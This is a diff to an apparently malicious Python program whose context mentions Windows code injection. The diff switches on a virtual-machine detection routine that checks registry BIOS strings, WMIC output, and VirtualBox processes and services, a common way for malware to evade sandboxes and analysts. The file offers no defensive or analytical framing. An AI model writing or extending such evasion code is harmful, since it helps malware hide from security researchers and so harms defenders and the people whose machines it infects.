@@ -1,12 +1,12 @@
 import os
 import platform
 import ctypes
-# import psutil
+import psutil
 import shutil
 import random
 import requests
 import time
-# import winreg
+import winreg
 
 
 # Constants for code injection (Windows only)
@@ -71,51 +71,51 @@ def is_virtual_environment():
 
         return False
     
-    # if platform.system() == "Windows":
-    #     # Check for VirtualBox specific registry entries
-    #     try:
-    #         with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System") as key:
-    #             value, _ = winreg.QueryValueEx(key, "SystemBiosVersion")
-    #             if "VirtualBox" in value:
-    #                 return True
-    #     except FileNotFoundError:
-    #         pass
+    if platform.system() == "Windows":
+        # Check for VirtualBox specific registry entries
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System") as key:
+                value, _ = winreg.QueryValueEx(key, "SystemBiosVersion")
+                if "VirtualBox" in value:
+                    return True
+        except FileNotFoundError:
+            pass
         
-    #     # Check for VirtualBox specific strings in system information
-    #     try:
-    #         import subprocess
-    #         output = subprocess.check_output("wmic computersystem get model", shell=True).decode()
-    #         if "VirtualBox" in output:
-    #             return True
-    #     except Exception:
-    #         pass
+        # Check for VirtualBox specific strings in system information
+        try:
+            import subprocess
+            output = subprocess.check_output("wmic computersystem get model", shell=True).decode()
+            if "VirtualBox" in output:
+                return True
+        except Exception:
+            pass
         
-    #     # Check for VirtualBox processes
-    #     virtualbox_processes = ["VirtualBox.exe", "VBoxService.exe", "VBoxTray.exe"]
-    #     for proc in virtualbox_processes:
-    #         try:
-    #             import psutil
-    #             for p in psutil.process_iter(['pid', 'name']):
-    #                 if proc in p.info['name']:
-    #                     return True
-    #         except ImportError:
-    #             print("psutil module is required for process checking")
-    #             return False
+        # Check for VirtualBox processes
+        virtualbox_processes = ["VirtualBox.exe", "VBoxService.exe", "VBoxTray.exe"]
+        for proc in virtualbox_processes:
+            try:
+                import psutil
+                for p in psutil.process_iter(['pid', 'name']):
+                    if proc in p.info['name']:
+                        return True
+            except ImportError:
+                print("psutil module is required for process checking")
+                return False
 
-    #     # Check for VirtualBox services
-    #     virtualbox_services = ["VBoxService", "VBoxTray"]
-    #     for service in virtualbox_services:
-    #         try:
-    #             import win32serviceutil
-    #             if win32serviceutil.QueryServiceStatus(service)[1] == win32serviceutil.SERVICE_RUNNING:
-    #                 return True
-    #         except ImportError:
-    #             print("pywin32 module is required for service checking")
-    #             return False
-    #         except Exception:
-    #             pass
+        # Check for VirtualBox services
+        virtualbox_services = ["VBoxService", "VBoxTray"]
+        for service in virtualbox_services:
+            try:
+                import win32serviceutil
+                if win32serviceutil.QueryServiceStatus(service)[1] == win32serviceutil.SERVICE_RUNNING:
+                    return True
+            except ImportError:
+                print("pywin32 module is required for service checking")
+                return False
+            except Exception:
+                pass
 
-    #     return False
+        return False
     
 
     return False
